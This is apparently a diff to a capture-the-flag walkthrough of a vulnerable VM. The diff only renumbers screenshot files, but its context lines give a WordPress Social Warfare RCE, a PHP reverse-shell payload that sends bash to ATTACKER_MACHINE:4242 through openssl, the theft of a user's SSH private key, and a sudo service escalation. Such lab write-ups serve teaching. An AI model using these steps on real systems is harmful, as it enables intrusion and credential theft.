@@ -18,7 +18,7 @@ Objectives:
 
    We'll use an intense scan on the victim vm (192.168.56.111), we can see web and ssh services running, but no aparent vulnerabilities yet.
    
-   ![victim machine nmap scan result](img/1-nmap.png)
+   ![victim machine nmap scan result](img/01-nmap.png)
 
 <br>
 
@@ -26,11 +26,11 @@ Objectives:
 
    If we visit the website we can see that there is only a big red image with the words "SO SIMPLE":
    
-   ![website](img/2-website.png)
+   ![website](img/02-website.png)
    
    And the website code doesn't reveal anything that's useful:
    
-   ![website origin code](img/3-website_origin.png)
+   ![website origin code](img/03-website_origin.png)
    
 <br>
 
@@ -44,7 +44,7 @@ Objectives:
 
    As there is no vulnerability that we can see in plain sight, dirb, will show us what are some sub-directories, and we can see that wordpress is installed:
   
-   ![dirb website results](img/4-dirb.png)
+   ![dirb website results](img/04-dirb.png)
 
 <br>
 
@@ -54,15 +54,15 @@ Objectives:
 
    And we'll run the command:  `sudo wpscan --api-token <API> --url http://192.168.56.111/wordpress/ -e`
    
-   ![wpscan result](img/5-wpscanFirst.png)
+   ![wpscan result](img/05-wpscanFirst.png)
 
    Here we can see that the plugin "Social Warfare has an RCE vulnerability that is probably going to work:
 
-   ![wpscan social warfare RCE](img/6-wpscanSocialWarfare.png)
+   ![wpscan social warfare RCE](img/06-wpscanSocialWarfare.png)
 
    If we scroll down further we can see the wordpress users that exist, we can see "admin" and "max":
 
-   ![wpscan users](img/7-wpscanUsers.png)
+   ![wpscan users](img/07-wpscanUsers.png)
 
 <br>
 
@@ -74,7 +74,7 @@ Objectives:
 
        We need a web server to serve our payload, this will be apache as it's simple and comes pre-installed on kali, we only need to enable it:
 
-       ![enable apache](img/7-apacheStart.png)
+       ![enable apache](img/08-apacheStart.png)
 
 
    - Netcat
@@ -84,7 +84,7 @@ Objectives:
        The command to execute will be `ncat --ssl -vv -l -p 4242`.
        This will listen for any connection on port 4242.
       
-       ![running netcat listener](img/8-ncatListener.png)
+       ![running netcat listener](img/09-ncatListener.png)
  
    - Payload
       
@@ -92,7 +92,7 @@ Objectives:
       
         ```system('mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_MACHINE:4242 > /tmp/s; rm /tmp/s')```
 
-      ![cat of the payload](img/9-catPayload.png)
+      ![cat of the payload](img/10-catPayload.png)
 
       The "ATTACKER_MACHINE" needs to be changed to our kali machine, in my case 192.168.56.1.. and the port needs to match the netcat listener above.
 
@@ -108,11 +108,11 @@ Objectives:
 
    Here we can see what happens after visiting the URL:
    
-   ![Exploit on web browser result](img/10-exploitWeb.png)
+   ![Exploit on web browser result](img/11-exploitWeb.png)
 
    And if we go back to the ncat terminal we can see that it has established the connection and now we have a shell with the user "www-data":
    
-   ![ncat receives the shell](img/11-exploitNcat.png)
+   ![ncat receives the shell](img/12-exploitNcat.png)
    
 <br>
 
@@ -120,15 +120,15 @@ Objectives:
 
   If we cd into the .ssh folder of the user "max", we can copy his ssh key, it's called id_rsa, we can use cat to list it and then copy it into a file called "key" on our kali machine.
   
-  ![copying the ssh key of user max](img/12-sshCopyKey.png)
+  ![copying the ssh key of user max](img/13-sshCopyKey.png)
 
   After copying id_rsa off of the user, we will add it into a file called key, it's important to change the file permissions to 700, and not using sudo to add the key:
   
-  ![adding max's ssh key to our system](img/13-addingKey.png)
+  ![adding max's ssh key to our system](img/14-addingKey.png)
 
   And now we can ssh into the server as user max, add the fingerprint, and we'll have ssh access:
 
-  ![connecting to user max with ssh](img/14-sshConnection.png)
+  ![connecting to user max with ssh](img/15-sshConnection.png)
 
 <br>
 
@@ -136,7 +136,7 @@ Objectives:
 
   Once inside and as user "max", if we ls their home directory we can see "personal.txt" this file is not useful, "this" is a folder with a bunch of subfolders with a little easter-egg and "user.txt" wich is the user flag we're after:
 
-  ![getting the flag with cat of the file user.txt](img/15-firstFlag.png)
+  ![getting the flag with cat of the file user.txt](img/16-firstFlag.png)
 
 <br>
 
@@ -144,7 +144,7 @@ Objectives:
 
    First we'll use the command `sudo -l` to list what services or scripts we have access to as root, but without using a password:
 
-   ![using sudo -l to list permissions](img/16-escalatingprivileges1.png)
+   ![using sudo -l to list permissions](img/17-escalatingprivileges1.png)
 
    We can see that  we have access to the service `/usr/sbin/service`.
 
@@ -156,7 +156,7 @@ Objectives:
    
    `sudo -u steven /usr/sbin/service ../../bin/bash`
 
-   ![using service to change into steven](img/17-escalatingprivileges2.png)
+   ![using service to change into steven](img/18-escalatingprivileges2.png)
 
 <br>
 
@@ -164,11 +164,11 @@ Objectives:
 
    Once we have logged in as the user steven, we can navigate to his home directory and cat the second flag:
 
-   ![getting the second flag on the user steven's home folder](img/18-secondFlag.png)
+   ![getting the second flag on the user steven's home folder](img/19-secondFlag.png)
 
    We can also list the hidden contents of the user's home, but we can't see anything really useful:
 
-   ![ls of hidden contents of user steven's home](img/19-escalatingtoroot1.png)
+   ![ls of hidden contents of user steven's home](img/20-escalatingtoroot1.png)
 
 <br>
    
